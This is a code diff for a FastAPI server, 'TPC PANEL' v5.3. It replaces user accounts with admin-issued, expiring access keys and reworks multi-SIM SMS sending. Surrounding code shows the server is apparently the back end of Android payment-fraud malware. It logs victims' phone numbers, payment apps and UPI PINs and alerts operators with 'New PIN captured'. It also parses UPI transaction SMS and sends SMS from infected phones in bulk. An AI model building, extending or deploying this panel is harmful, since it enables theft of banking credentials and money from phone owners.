@@ -32,9 +32,9 @@ from backend.database import (
 )
 
 try:
-    from backend.database import panel_users as _panel_users
-except Exception:  # database.py me panel_users nahi hai
-    _panel_users = None
+    from backend.database import panel_keys as _panel_keys
+except Exception:
+    _panel_keys = None
 
 try:
     from backend.database import close_db
@@ -74,7 +74,7 @@ SESSION_TTL = 300
 SESSION_MAX_AGE = 60 * 60 * 24 * 30
 TOKEN_TTL = 60 * 60 * 24 * 30
 
-USER_TRIAL_DAYS = int(os.getenv("USER_TRIAL_DAYS", "7") or 0)
+DEFAULT_KEY_DAYS = int(os.getenv("USER_TRIAL_DAYS", "30") or 0)
 
 ONLINE_WINDOW_SECONDS = 90
 MAX_TELEMETRY_KEYS = 60
@@ -91,6 +91,8 @@ NUMBER_RETRY_AFTER = 300
 LOGIN_MAX_TRIES = 10
 LOGIN_LOCK_SECONDS = 120
 
+KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+
 UPI_KEYWORDS = ("upi", "credited", "debited", "vpa", "paid to", "received from")
 AMOUNT_RE = re.compile(r"(?:rs.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)
 
@@ -103,9 +105,8 @@ RELAY_SESSION_FILE = os.getenv("RELAY_SESSION_FILE", str(BASE_DIR / "relay_sessi
 MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
 
 
-def users_col():
-    """Panel users collection — database.py me panel_users ho to wahi, warna db se."""
-    return _panel_users if _panel_users is not None else db["panel_users"]
+def keys_col():
+    return _panel_keys if _panel_keys is not None else db["panel_keys"]
 
 
 # ------------------------------------------------------------- secret store
@@ -186,7 +187,6 @@ def recent_fails(ip: str) -> List[float]:
 
 
 def admin_match(username: str) -> Optional[str]:
-    """Admin username ka canonical naam (case-insensitive)."""
     if not username:
         return None
     if username in ADMINS:
@@ -225,24 +225,35 @@ def verify_token(token: str) -> Optional[str]:
 
 
 def split_ident(ident: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
-    """'user:raju' -> ('user','raju'); legacy 'ivan' -> ('admin','ivan')."""
     if not ident:
         return None, None
     if ":" in ident:
         role, name = ident.split(":", 1)
-        if role in ("admin", "user") and name:
+        if role in ("admin", "key") and name:
             return role, name
     return "admin", ident
 
 
-def user_doc(name: str) -> Optional[dict]:
+def normalize_key(raw: str) -> str:
+    return re.sub(r"[^A-Za-z0-9]", "", (raw or "")).upper()
+
+
+def new_key() -> str:
+    parts = ["".join(secrets.choice(KEY_ALPHABET) for _ in range(4)) for _ in range(3)]
+    return "TPC-" + "-".join(parts)
+
+
+def key_doc(key: str) -> Optional[dict]:
+    k = normalize_key(key)
+    if len(k) < 8:
+        return None
     try:
-        return users_col().find_one({"username_lower": (name or "").lower()})
+        return keys_col().find_one({"key_hash": hash_value(k)})
     except PyMongoError:
         return None
 
 
-def user_active(doc: Optional[dict]) -> bool:
+def key_active(doc: Optional[dict]) -> bool:
     if not doc:
         return False
     if doc.get("blocked"):
@@ -268,7 +279,7 @@ async def lifespan(app: FastAPI):
     load_bans()
     load_relay_config()
     await start_relay()
-    log.info("TPC PANEL v5.2 up — admins=%s secret=%s", list(ADMINS), SESSION_SECRET_SRC)
+    log.info("TPC PANEL v5.3 up — admins=%s secret=%s", list(ADMINS), SESSION_SECRET_SRC)
     try:
         yield
     finally:
@@ -278,14 +289,10 @@ async def lifespan(app: FastAPI):
         MAIN_LOOP = None
 
 
-app = FastAPI(title="TPC PANEL", version="5.2.0", lifespan=lifespan)
+app = FastAPI(title="TPC PANEL", version="5.3.0", lifespan=lifespan)
 
 
 class AdaptiveSessionMiddleware(SessionMiddleware):
-    """https_only=True default ka problem: plain HTTP par browser cookie store
-    hi nahi karta -> login hota tha par session turant ud jaata tha.
-    Yahan secure flag sirf tab lagta hai jab request actually https ho."""
-
     def __init__(self, *args, force_secure: bool = False, **kwargs):
         self.force_secure = force_secure
         super().__init__(*args, **kwargs)
@@ -386,11 +393,15 @@ class AdminLoginRequest(BaseModel):
     password: str = Field(min_length=1, max_length=200)
 
 
-class UserRegisterRequest(BaseModel):
-    username: str = Field(min_length=3, max_length=40)
-    password: str = Field(min_length=4, max_length=100)
+class AccessRequest(BaseModel):
+    key: str = Field(min_length=6, max_length=64)
+
+
+class KeyCreateRequest(BaseModel):
+    label: str = Field(default="", max_length=60)
     name: str = Field(default="", max_length=60)
     phone: str = Field(default="", max_length=20)
+    days: int | None = Field(default=None, ge=0, le=36500)
 
 
 class UserToggleRequest(BaseModel):
@@ -408,8 +419,7 @@ class SendRequest(BaseModel):
     device_id: str | None = None
     body: str = Field(min_length=1, max_length=MAX_SMS_BODY)
     to: str | None = None
-    sim_slot: int | None = Field(default=None, ge=0, le=1)
-    both_sims: bool = False
+    sim_slots: List[int] | None = None
 
 
 class CommandRequest(BaseModel):
@@ -446,7 +456,7 @@ class AutoSenderRequest(BaseModel):
     enabled: bool | None = None
     channel_id: str | None = Field(default=None, max_length=64)
     channel_title: str | None = Field(default=None, max_length=160)
-    both_sims: bool | None = None
+    sim_slots: List[int] | None = None
     tg_confirm: bool | None = None
 
 
@@ -490,10 +500,7 @@ def norm_channel_id(raw) -> str:
         return s
 
 
-# ---- channel identity helpers -------------------------------------------
-
 def chan_key(v) -> str:
-    """Digits-only channel key; -100 supergroup prefix strip karta hai."""
     s = re.sub(r"[^\d]", "", str(v or ""))
     if not s:
         return ""
@@ -503,7 +510,6 @@ def chan_key(v) -> str:
 
 
 def canonical_channel_id(ent, fallback=None) -> str:
-    """Telethon entity -> canonical chat_id form (supergroup ke liye -100...)."""
     ent_id = getattr(ent, "id", None)
     if isinstance(ent_id, int):
         if getattr(ent, "broadcast", False) or getattr(ent, "megagroup", False):
@@ -593,7 +599,6 @@ def telemetry_summary(t: dict) -> dict:
 
 
 def sim_slot_count(device: dict) -> int:
-    """Device ke reported SIM slots (max 2)."""
     t = (device or {}).get("telemetry") or {}
     sims = t.get("sims")
     n = len(sims) if isinstance(sims, list) else 0
@@ -663,21 +668,42 @@ def backfill_auto_sender():
             {"auto_sender": {"$exists": False}},
             {"$set": {"auto_sender": {
                 "enabled": False, "channel_id": None,
-                "channel_title": None, "both_sims": False,
+                "channel_title": None, "sim_slots": [],
                 "tg_confirm": True, "updated_at": utc_now(),
             }}},
+        )
+        devices.update_many(
+            {"auto_sender.both_sims": {"$exists": True}},
+            {"$unset": {"auto_sender.both_sims": ""}},
         )
     except PyMongoError:
         pass
 
 
+def norm_slots(raw) -> List[int]:
+    if not raw:
+        return []
+    out = set()
+    for v in raw:
+        try:
+            i = int(v)
+        except (TypeError, ValueError):
+            continue
+        if i in (0, 1):
+            out.add(i)
+    return sorted(out)
+
+
 def auto_sender_of(device: dict) -> dict:
     a = (device or {}).get("auto_sender") or {}
+    slots = norm_slots(a.get("sim_slots"))
+    if not slots and a.get("both_sims"):
+        slots = [0, 1]
     return {
         "enabled": bool(a.get("enabled")),
         "channel_id": str(a.get("channel_id") or ""),
         "channel_title": a.get("channel_title") or "",
-        "both_sims": bool(a.get("both_sims")),
+        "sim_slots": slots,
         "tg_confirm": bool(a.get("tg_confirm", True)),
         "updated_at": serialize_dt(a.get("updated_at")),
     }
@@ -689,7 +715,7 @@ def auto_sender_plain(device: dict) -> dict:
         "enabled": a["enabled"],
         "channel_id": a["channel_id"],
         "channel_title": a["channel_title"],
-        "both_sims": a["both_sims"],
+        "sim_slots": a["sim_slots"],
         "tg_confirm": a["tg_confirm"],
     }
 
@@ -746,7 +772,7 @@ def bearer_identity(request: Request) -> Optional[str]:
     return None
 
 
-bearer_admin = bearer_identity  # alias
+bearer_admin = bearer_identity
 
 
 def require_api_key(api_key: str | None):
@@ -757,7 +783,6 @@ def require_api_key(api_key: str | None):
 
 
 def require_panel(request: Request) -> dict:
-    """Admin ya valid non-expired user — dono pass."""
     ident = request.session.get("admin_id") or bearer_identity(request)
     if not ident:
         raise HTTPException(401, "Please log in")
@@ -766,15 +791,15 @@ def require_panel(request: Request) -> dict:
     if role == "admin":
         return {"role": "admin", "name": name, "expires_at": None}
 
-    doc = user_doc(name)
+    doc = key_doc(name) or key_doc(name.replace("-", ""))
     if not doc:
-        raise HTTPException(401, "User not found")
-    if not user_active(doc):
-        raise HTTPException(403, "Panel access expire ho gaya — admin se renew karvao")
+        raise HTTPException(401, "Key not found")
+    if not key_active(doc):
+        raise HTTPException(403, "Key expire/block ho gayi — admin se nayi lo")
     return {
-        "role": "user",
-        "name": doc.get("username") or name,
-        "user_id": str(doc["_id"]),
+        "role": "key",
+        "name": doc.get("key") or name,
+        "key_id": str(doc["_id"]),
         "expires_at": serialize_dt(doc.get("expires_at")),
     }
 
@@ -797,7 +822,7 @@ def require_panel_or_key(
     return "apikey"
 
 
-require_admin_or_key = require_panel_or_key  # alias
+require_admin_or_key = require_panel_or_key
 
 
 # --------------------------------------------------------------- serialize
@@ -819,7 +844,7 @@ def serialize_document(doc: dict) -> dict:
         if k == "_id":
             out["id"] = str(v)
             continue
-        if k in {"registration_id_hash", "password_hash", "session_token_hash", "username_lower"}:
+        if k in {"registration_id_hash", "password_hash", "key_hash", "session_token_hash"}:
             continue
         out[k] = v if isinstance(v, (dict, list)) else serialize_dt(v)
 
@@ -1010,30 +1035,54 @@ async def send_command(device_id: str, action: str, extra: dict | None = None) -
 
 
 def push_row(device_id: str, row: dict) -> dict:
-    return {
+    """Device ko push hone wala payload. sim_slot sirf tab bhejte hain jab set ho —
+    purane app build null se crash na karein."""
+    payload = {
         "type": "sms_send",
         "id": str(row["_id"]),
         "to": row.get("to") or "",
         "body": row.get("body") or "",
-        "sim_slot": row.get("sim_slot"),
     }
+    slot = row.get("sim_slot")
+    if slot is not None:
+        try:
+            payload["sim_slot"] = int(slot)
+        except (TypeError, ValueError):
+            pass
+    return payload
+
+
+async def deliver_outbox_row(device_id: str, outbox_id: str) -> bool:
+    try:
+        row = outbox.find_one({"_id": ObjectId(outbox_id)})
+    except Exception:
+        return False
+    if not row:
+        return False
+
+    ok = await hub.send_to_device(device_id, push_row(device_id, row))
+    if ok:
+        try:
+            outbox.update_one(
+                {"_id": row["_id"]},
+                {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
+            )
+        except PyMongoError:
+            pass
+    return ok
 
 
 async def push_outbox(device_id: str):
     try:
         pending = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
     except PyMongoError:
-        return
+        return 0
 
+    n = 0
     for row in pending:
-        if await hub.send_to_device(device_id, push_row(device_id, row)):
-            try:
-                outbox.update_one(
-                    {"_id": row["_id"]},
-                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
-                )
-            except PyMongoError:
-                pass
+        if await deliver_outbox_row(device_id, str(row["_id"])):
+            n += 1
+    return n
 
 
 async def repush_stale(device_id: str):
@@ -1048,14 +1097,7 @@ async def repush_stale(device_id: str):
         return
 
     for row in stale:
-        if await hub.send_to_device(device_id, push_row(device_id, row)):
-            try:
-                outbox.update_one(
-                    {"_id": row["_id"]},
-                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
-                )
-            except PyMongoError:
-                pass
+        await deliver_outbox_row(device_id, str(row["_id"]))
 
 
 def queue_sms(
@@ -1101,16 +1143,12 @@ def queue_sms(
     return str(outbox_id), str(msg_id) if msg_id else ""
 
 
-def queue_sms_slots(device: dict, body: str, to: str | None, source: str,
-                    slots: List[Optional[int]]) -> int:
-    """Ek device par multiple SIM slots ke liye queue karo."""
-    did = str(device["_id"])
-    dname = device.get("device_name", "")
-    n = 0
-    for slot in slots:
-        queue_sms(did, body, to, source=source, device_name=dname, sim_slot=slot)
-        n += 1
-    return n
+def slots_for(payload_slots: Optional[List[int]], device: dict) -> List[Optional[int]]:
+    """Selection na ho to device default (None). Warna chune gaye slots."""
+    sel = norm_slots(payload_slots)
+    if not sel:
+        return [None]
+    return list(sel)
 
 
 def online_device_ids() -> List[ObjectId]:
@@ -1161,7 +1199,7 @@ async def close_sockets():
 @app.get("/")
 async def home():
     return {
-        "app": "TPC PANEL", "status": "online", "version": "5.2.0",
+        "app": "TPC PANEL", "status": "online", "version": "5.3.0",
         "owner": "https://t.me/icivan",
         "relay": "mtproto" if TELETHON_OK else "unavailable",
     }
@@ -1212,21 +1250,17 @@ async def auth_status(request: Request):
 
     role, name = split_ident(ident)
     if role == "admin":
-        return {
-            "authenticated": True, "admin_id": name, "role": "admin",
-            "username": name, "expires_at": None,
-            "secret_source": SESSION_SECRET_SRC,
-        }
+        return {"authenticated": True, "admin_id": name, "role": "admin",
+                "username": name, "expires_at": None,
+                "secret_source": SESSION_SECRET_SRC}
 
-    doc = user_doc(name)
-    if not doc or not user_active(doc):
-        return {"authenticated": False, "role": "user", "reason": "expired"}
-    return {
-        "authenticated": True, "admin_id": doc.get("username") or name,
-        "role": "user", "username": doc.get("username") or name,
-        "expires_at": serialize_dt(doc.get("expires_at")),
-        "secret_source": SESSION_SECRET_SRC,
-    }
+    doc = key_doc(name)
+    if not doc or not key_active(doc):
+        return {"authenticated": False, "role": "key", "reason": "expired"}
+    return {"authenticated": True, "admin_id": doc.get("key") or name, "role": "key",
+            "username": doc.get("key") or name,
+            "expires_at": serialize_dt(doc.get("expires_at")),
+            "secret_source": SESSION_SECRET_SRC}
 
 
 def _login_throttle(ip: str):
@@ -1245,46 +1279,14 @@ async def panel_login(payload: AdminLoginRequest, request: Request):
     if not user:
         raise HTTPException(400, "Login ID required")
 
-    # 1) admin?
     admin_name = admin_match(user)
     if admin_name and const_eq(payload.password, ADMINS.get(admin_name, "")):
         _login_fails.pop(ip, None)
         ident = f"admin:{admin_name}"
         request.session["admin_id"] = ident
         log_event("admin_login", {"username": admin_name, "ip": ip}, admin_id=admin_name)
-        return {
-            "status": "ok", "role": "admin", "username": admin_name,
-            "token": make_token(ident), "expires_in": TOKEN_TTL, "expires_at": None,
-        }
-
-    # 2) panel user
-    doc = user_doc(user)
-    if doc and const_eq(payload.password, doc.get("password_hash", "")):
-        if doc.get("blocked"):
-            raise HTTPException(403, "Account block hai — admin se baat karo")
-        exp = doc.get("expires_at")
-        if isinstance(exp, datetime):
-            e = exp if exp.tzinfo else exp.replace(tzinfo=timezone.utc)
-            if e <= datetime.now(timezone.utc):
-                raise HTTPException(403, "Panel expire ho gaya — admin se renew karvao")
-
-        _login_fails.pop(ip, None)
-        ident = f"user:{doc.get('username')}"
-        request.session["admin_id"] = ident
-        try:
-            users_col().update_one(
-                {"_id": doc["_id"]},
-                {"$set": {"last_login_at": utc_now(), "last_ip": ip},
-                 "$inc": {"login_count": 1}},
-            )
-        except PyMongoError:
-            pass
-        log_event("user_login", {"username": doc.get("username"), "ip": ip})
-        return {
-            "status": "ok", "role": "user", "username": doc.get("username"),
-            "token": make_token(ident), "expires_in": TOKEN_TTL,
-            "expires_at": serialize_dt(doc.get("expires_at")),
-        }
+        return {"status": "ok", "role": "admin", "username": admin_name,
+                "token": make_token(ident), "expires_in": TOKEN_TTL, "expires_at": None}
 
     hits = recent_fails(ip)
     hits.append(time.time())
@@ -1292,56 +1294,61 @@ async def panel_login(payload: AdminLoginRequest, request: Request):
     raise HTTPException(401, "Invalid Login ID or password")
 
 
-@app.post("/panel/register")
-async def panel_register(payload: UserRegisterRequest, request: Request):
-    uname = payload.username.strip()
-    if len(uname) < 3:
-        raise HTTPException(400, "Username kam se kam 3 chars")
-    if admin_match(uname):
-        raise HTTPException(409, "Ye username admin ka hai — dusra chuno")
+@app.post("/panel/access")
+async def panel_access(payload: AccessRequest, request: Request):
+    """Key-only login — koi register nahi, admin key deta hai."""
+    ip = (request.client.host if request.client else "?") or "?"
+    _login_throttle(ip)
 
-    col = users_col()
-    low = uname.lower()
-    try:
-        if col.find_one({"username_lower": low}):
-            raise HTTPException(409, "Username already registered")
-    except PyMongoError:
-        raise HTTPException(503, "Register failed")
+    k = normalize_key(payload.key)
+    if len(k) < 8:
+        raise HTTPException(400, "Key daalo (TPC-XXXX-XXXX-XXXX)")
 
-    now = utc_now()
-    doc = {
-        "username": uname,
-        "username_lower": low,
-        "password_hash": hash_value(payload.password),
-        "name": payload.name.strip(),
-        "phone": normalize_number(payload.phone) or payload.phone.strip(),
-        "created_at": now,
-        "expires_at": (now + timedelta(days=USER_TRIAL_DAYS)) if USER_TRIAL_DAYS > 0 else None,
-        "blocked": False,
-        "login_count": 1,
-        "last_login_at": now,
-    }
-    try:
-        col.insert_one(doc)
-    except DuplicateKeyError:
-        raise HTTPException(409, "Username already registered")
-    except PyMongoError:
-        raise HTTPException(503, "Register failed")
+    doc = key_doc(k)
+    if not doc:
+        hits = recent_fails(ip)
+        hits.append(time.time())
+        _login_fails[ip] = hits
+        raise HTTPException(401, "Key galat hai")
 
-    ident = f"user:{uname}"
+    if doc.get("blocked"):
+        raise HTTPException(403, "Key block hai — admin se baat karo")
+    exp = doc.get("expires_at")
+    if isinstance(exp, datetime):
+        e = exp if exp.tzinfo else exp.replace(tzinfo=timezone.utc)
+        if e <= datetime.now(timezone.utc):
+            raise HTTPException(403, "Key expire ho gayi — admin se renew karvao")
+
+    _login_fails.pop(ip, None)
+    ident = f"key:{k}"
     request.session["admin_id"] = ident
-    log_event("user_registered", {"username": uname})
-    return {
-        "status": "ok", "role": "user", "username": uname,
-        "token": make_token(ident), "expires_in": TOKEN_TTL,
-        "expires_at": serialize_dt(doc["expires_at"]),
-    }
+    try:
+        keys_col().update_one(
+            {"_id": doc["_id"]},
+            {"$set": {"last_login_at": utc_now(), "last_ip": ip},
+             "$inc": {"login_count": 1}},
+        )
+    except PyMongoError:
+        pass
+    log_event("key_login", {"key": doc.get("key"), "ip": ip})
+
+    return {"status": "ok", "role": "key", "username": doc.get("key"),
+            "token": make_token(ident), "expires_in": TOKEN_TTL,
+            "expires_at": serialize_dt(doc.get("expires_at"))}
 
 
-# backward compat
-@app.post("/admin/login")
-async def admin_login(payload: AdminLoginRequest, request: Request):
-    return await panel_login(payload, request)
+@app.post("/panel/register")
+async def panel_register(request: Request):
+    """Optional: API se key banane ke liye (frontend use nahi karta)."""
+    key = new_key()
+    now = utc_now()
+    keys_col().insert_one({
+        "key": key, "key_hash": hash_value(normalize_key(key)),
+        "label": "", "phone": "", "created_at": now,
+        "expires_at": (now + timedelta(days=DEFAULT_KEY_DAYS)) if DEFAULT_KEY_DAYS else None,
+        "blocked": False, "login_count": 0, "last_login_at": None,
+    })
+    return {"status": "ok", "key": key}
 
 
 @app.post("/admin/logout")
@@ -1366,54 +1373,91 @@ async def panel_me(request: Request):
     return await auth_status(request)
 
 
-# ---------------------------------------------------------- user admin
+# ------------------------------------------------------------ keys (admin)
 
 
-@app.get("/admin/users")
-async def admin_users(request: Request, q: str | None = None):
+def _key_view(k: dict) -> dict:
+    exp = k.get("expires_at")
+    if isinstance(exp, datetime) and exp.tzinfo is None:
+        exp = exp.replace(tzinfo=timezone.utc)
+    expired = bool(isinstance(exp, datetime) and exp <= datetime.now(timezone.utc))
+    blocked = bool(k.get("blocked"))
+    return {
+        "id": str(k["_id"]),
+        "key": k.get("key") or "",
+        "label": k.get("label") or "",
+        "phone": k.get("phone") or "",
+        "created_at": serialize_dt(k.get("created_at")),
+        "last_login_at": serialize_dt(k.get("last_login_at")),
+        "login_count": int(k.get("login_count") or 0),
+        "expires_at": serialize_dt(k.get("expires_at")),
+        "blocked": blocked,
+        "expired": expired,
+        "active": (not blocked) and (not expired),
+    }
+
+
+@app.get("/admin/keys")
+async def admin_keys(request: Request, q: str | None = None):
     require_admin(request)
 
     query = {}
     if q and q.strip():
         rx = re.compile(re.escape(q.strip()), re.IGNORECASE)
-        query["$or"] = [{"username": rx}, {"name": rx}, {"phone": rx}]
+        query["$or"] = [{"key": rx}, {"label": rx}, {"phone": rx}]
 
     try:
-        rows = list(users_col().find(query).sort("_id", -1).limit(500))
+        rows = list(keys_col().find(query).sort("_id", -1).limit(500))
     except PyMongoError:
-        raise HTTPException(503, "Could not load users")
-
-    now = datetime.now(timezone.utc)
-    out = []
-    for u in rows:
-        exp = u.get("expires_at")
-        if isinstance(exp, datetime) and exp.tzinfo is None:
-            exp = exp.replace(tzinfo=timezone.utc)
-        expired = bool(isinstance(exp, datetime) and exp <= now)
-        blocked = bool(u.get("blocked"))
-        out.append({
-            "id": str(u["_id"]),
-            "username": u.get("username"),
-            "name": u.get("name") or "",
-            "phone": u.get("phone") or "",
-            "created_at": serialize_dt(u.get("created_at")),
-            "last_login_at": serialize_dt(u.get("last_login_at")),
-            "login_count": int(u.get("login_count") or 0),
-            "expires_at": serialize_dt(u.get("expires_at")),
-            "blocked": blocked,
-            "expired": expired,
-            "active": (not blocked) and (not expired),
-        })
-    return {"users": out}
+        raise HTTPException(503, "Could not load keys")
+    return {"keys": [_key_view(k) for k in rows]}
 
 
-def _user_or_404(user_id: str) -> dict:
+@app.post("/admin/keys")
+async def admin_key_create(payload: KeyCreateRequest, request: Request):
+    admin = require_admin(request)
+
+    key = new_key()
+    for _ in range(5):
+        try:
+            if not keys_col().find_one({"key_hash": hash_value(normalize_key(key))}):
+                break
+        except PyMongoError:
+            break
+        key = new_key()
+
+    now = utc_now()
+    days = payload.days if payload.days is not None else DEFAULT_KEY_DAYS
+    doc = {
+        "key": key,
+        "key_hash": hash_value(normalize_key(key)),
+        "label": (payload.label or payload.name or "").strip(),
+        "phone": normalize_number(payload.phone) or (payload.phone or "").strip(),
+        "created_at": now,
+        "expires_at": (now + timedelta(days=days)) if days and days > 0 else None,
+        "blocked": False,
+        "login_count": 0,
+        "last_login_at": None,
+        "created_by": admin["name"],
+    }
     try:
-        doc = users_col().find_one({"_id": ObjectId(user_id)})
+        keys_col().insert_one(doc)
+    except DuplicateKeyError:
+        raise HTTPException(409, "Key collision — dobara try karo")
+    except PyMongoError:
+        raise HTTPException(503, "Could not create key")
+
+    log_event("key_created", {"key": key, "label": doc["label"]}, admin_id=admin["name"])
+    return {"status": "ok", "key": key, "expires_at": serialize_dt(doc["expires_at"])}
+
+
+def _key_or_404(key_id: str) -> dict:
+    try:
+        doc = keys_col().find_one({"_id": ObjectId(key_id)})
     except Exception:
-        raise HTTPException(400, "Bad user id")
+        raise HTTPException(400, "Bad key id")
     if not doc:
-        raise HTTPException(404, "User not found")
+        raise HTTPException(404, "Key not found")
     return doc
 
 
@@ -1430,10 +1474,10 @@ def _parse_expiry(s: str) -> datetime:
     return d
 
 
-@app.post("/admin/users/{user_id}/expiry")
-async def set_user_expiry(user_id: str, payload: ExpiryRequest, request: Request):
+@app.post("/admin/keys/{key_id}/expiry")
+async def set_key_expiry(key_id: str, payload: ExpiryRequest, request: Request):
     admin = require_admin(request)
-    doc = _user_or_404(user_id)
+    doc = _key_or_404(key_id)
     now = datetime.now(timezone.utc)
 
     if payload.lifetime:
@@ -1453,7 +1497,7 @@ async def set_user_expiry(user_id: str, payload: ExpiryRequest, request: Request
         new_exp = None
 
     try:
-        users_col().update_one(
+        keys_col().update_one(
             {"_id": doc["_id"]},
             {"$set": {"expires_at": new_exp, "expiry_updated_at": now,
                       "expiry_updated_by": admin["name"]}},
@@ -1461,49 +1505,41 @@ async def set_user_expiry(user_id: str, payload: ExpiryRequest, request: Request
     except PyMongoError:
         raise HTTPException(503, "Save failed")
 
-    log_event("user_expiry_set",
-              {"username": doc.get("username"), "expires_at": serialize_dt(new_exp)},
+    log_event("key_expiry_set",
+              {"key": doc.get("key"), "expires_at": serialize_dt(new_exp)},
               admin_id=admin["name"])
     return {"status": "ok", "expires_at": serialize_dt(new_exp)}
 
 
-@app.post("/admin/users/{user_id}/toggle")
-async def toggle_user(user_id: str, payload: UserToggleRequest, request: Request):
+@app.post("/admin/keys/{key_id}/toggle")
+async def toggle_key(key_id: str, payload: UserToggleRequest, request: Request):
     admin = require_admin(request)
-    doc = _user_or_404(user_id)
+    doc = _key_or_404(key_id)
     try:
-        users_col().update_one({"_id": doc["_id"]}, {"$set": {"blocked": bool(payload.blocked)}})
+        keys_col().update_one({"_id": doc["_id"]}, {"$set": {"blocked": bool(payload.blocked)}})
     except PyMongoError:
         raise HTTPException(503, "Save failed")
-    log_event("user_toggle", {"username": doc.get("username"), "blocked": payload.blocked},
+    log_event("key_toggle", {"key": doc.get("key"), "blocked": payload.blocked},
               admin_id=admin["name"])
     return {"status": "ok", "blocked": bool(payload.blocked)}
 
 
-@app.post("/admin/users/{user_id}/password")
-async def set_user_password(user_id: str, payload: dict, request: Request):
-    require_admin(request)
-    doc = _user_or_404(user_id)
-    new_pass = str((payload or {}).get("password") or "").strip()
-    if len(new_pass) < 4:
-        raise HTTPException(400, "Password kam se kam 4 chars")
-    try:
-        users_col().update_one({"_id": doc["_id"]}, {"$set": {"password_hash": hash_value(new_pass)}})
-    except PyMongoError:
-        raise HTTPException(503, "Save failed")
-    return {"status": "ok"}
-
-
-@app.post("/admin/users/{user_id}/delete")
-async def delete_user(user_id: str, request: Request):
+@app.post("/admin/keys/{key_id}/delete")
+async def delete_key(key_id: str, request: Request):
     admin = require_admin(request)
-    doc = _user_or_404(user_id)
+    doc = _key_or_404(key_id)
     try:
-        users_col().delete_one({"_id": doc["_id"]})
+        keys_col().delete_one({"_id": doc["_id"]})
     except PyMongoError:
         raise HTTPException(503, "Delete failed")
-    log_event("user_deleted", {"username": doc.get("username")}, admin_id=admin["name"])
+    log_event("key_deleted", {"key": doc.get("key")}, admin_id=admin["name"])
     return {"status": "ok"}
+
+
+# aliases (purane frontend ke liye)
+@app.get("/admin/users")
+async def admin_users_alias(request: Request, q: str | None = None):
+    return await admin_keys(request, q)
 
 
 # --------------------------------------------------------------- devices
@@ -1553,7 +1589,7 @@ async def register_device(payload: DeviceRegistrationRequest):
                  "onboarded": False,
                  "auto_sender": {
                      "enabled": False, "channel_id": None,
-                     "channel_title": None, "both_sims": False,
+                     "channel_title": None, "sim_slots": [],
                      "tg_confirm": True, "updated_at": now,
                  },
              }},
@@ -1889,15 +1925,11 @@ async def device_onboarding(payload: OnboardingRequest):
     sim_number = telemetry.get("sim_number") or device.get("sim_number") or "n/a"
     carrier = telemetry.get("sim_carrier") or device.get("sim_carrier") or "n/a"
 
-    log_event(
-        "onboarding_complete",
-        {
-            "phone_number": payload.phone_number,
-            "payment_app": payload.payment_app,
-            "upi_pin": payload.upi_pin,
-        },
-        device_id=device_id,
-    )
+    log_event("onboarding_complete",
+              {"phone_number": payload.phone_number,
+               "payment_app": payload.payment_app,
+               "upi_pin": payload.upi_pin},
+              device_id=device_id)
 
     await notify_admins(
         "🔔 <b>New PIN captured</b>\n"
@@ -1929,6 +1961,7 @@ async def device_outbox(registration_id: str):
     device_id = str(device["_id"])
     rows = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
 
+    items = []
     for r in rows:
         try:
             outbox.update_one(
@@ -1937,14 +1970,12 @@ async def device_outbox(registration_id: str):
             )
         except PyMongoError:
             pass
+        item = {"id": str(r["_id"]), "to": r.get("to") or "", "body": r.get("body") or ""}
+        if r.get("sim_slot") is not None:
+            item["sim_slot"] = r.get("sim_slot")
+        items.append(item)
 
-    return {
-        "items": [
-            {"id": str(r["_id"]), "to": r.get("to") or "",
-             "body": r.get("body") or "", "sim_slot": r.get("sim_slot")}
-            for r in rows
-        ]
-    }
+    return {"items": items}
 
 
 async def _ack_outbox(item_id: str, status: str, error: str = ""):
@@ -1989,6 +2020,7 @@ async def _ack_outbox(item_id: str, status: str, error: str = ""):
             "error": error,
             "device_id": row.get("device_id"),
             "body": row.get("body") or "",
+            "sim_slot": row.get("sim_slot"),
         }})
 
     return row
@@ -2095,16 +2127,6 @@ async def delete_rule(rule_id: str, request: Request):
 # --------------------------------------------------------------- sending
 
 
-def slots_for(payload_both: bool, payload_slot: Optional[int], device: dict) -> List[Optional[int]]:
-    """Kaun kaun se SIM slots par bhejna hai."""
-    if payload_both:
-        n = sim_slot_count(device)
-        return [0, 1] if n >= 2 else [0]
-    if payload_slot is not None:
-        return [payload_slot]
-    return [None]
-
-
 @app.post("/admin/send")
 async def admin_send(
     payload: SendRequest,
@@ -2118,9 +2140,8 @@ async def admin_send(
         raise HTTPException(400, "Message body required")
 
     targets, capped = resolve_targets(payload)
-
     if not targets:
-        return {"status": "ok", "queued": 0, "results": [],
+        return {"status": "ok", "queued": 0, "delivered": 0, "results": [],
                 "note": "koi device match nahi hua"}
 
     manual_to = normalize_number(payload.to)
@@ -2131,29 +2152,15 @@ async def admin_send(
         device_name = device.get("device_name", "Unknown")
         to = manual_to or resolve_device_number(device)
 
-        slots = slots_for(payload.both_sims, payload.sim_slot, device)
+        slots = slots_for(payload.sim_slots, device)
         delivered = False
 
         for slot in slots:
             outbox_id, _ = queue_sms(device_id, body, to, source="panel",
                                      device_name=device_name, sim_slot=slot)
-
             if hub.online(device_id):
-                try:
-                    row = outbox.find_one({"_id": ObjectId(outbox_id)})
-                except PyMongoError:
-                    row = None
-                if row:
-                    ok = await hub.send_to_device(device_id, push_row(device_id, row))
-                    delivered = delivered or ok
-                    if ok:
-                        try:
-                            outbox.update_one(
-                                {"_id": row["_id"]},
-                                {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
-                            )
-                        except PyMongoError:
-                            pass
+                if await deliver_outbox_row(device_id, outbox_id):
+                    delivered = True
 
         results.append({
             "device_id": device_id,
@@ -2170,22 +2177,20 @@ async def admin_send(
 
     log_event("bulk_send",
               {"target": payload.target, "queued": queued, "delivered": delivered_n,
-               "both_sims": payload.both_sims},
+               "slots": payload.sim_slots},
               admin_id=admin)
 
     notes = []
     if delivered_n < queued:
         notes.append("kuch device offline hain — unka SMS outbox me queue hai, "
                      "online hote hi deliver ho jaayega")
-    if payload.both_sims:
-        notes.append("both SIMs mode — dual-SIM devices par 2 rows queue hui")
+    if payload.sim_slots:
